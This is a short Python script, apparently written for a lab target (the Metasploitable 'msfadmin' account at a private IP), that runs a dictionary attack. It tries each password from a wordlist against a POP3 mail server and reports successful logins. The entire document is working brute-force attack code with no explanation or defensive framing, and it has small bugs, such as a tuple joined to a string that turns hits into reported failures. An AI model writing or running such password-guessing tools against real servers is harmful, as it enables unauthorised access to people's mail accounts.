#!/usr/bin/python3.7
from poplib import POP3

username='msfadmin'
password='msfadmin'
target = "10.171.1.129"
port = '110'

fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
wordlist="wordlist.txt"
msg_start=".....::: POP3 Dictionary Attack  - POP3LIB :::....." 
msg_final=".....::: POP3 Dictionary Attack finished :::....." 
msg_ftpclient="List of files on / of home directory"


print(msg_start)

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            pop3conn = POP3(target, port)
            pop3conn.user(username)
            pop3conn.pass_(_password)
            pop3srvmsg = pop3conn.getwelcome().decode('utf-8')

            print(ok  + msg_ok + username + msg_pass + _password)
            print(ok + ' ' + 'Connection successful')
            print(ok + ' ' + pop3srvmsg)
            print(ok + ' ' + pop3conn.stat())

            pop3conn.quit()

        except:
            print( fail + msg_fail + username + msg_pass + _password)
            pop3conn.quit()

print(msg_final)
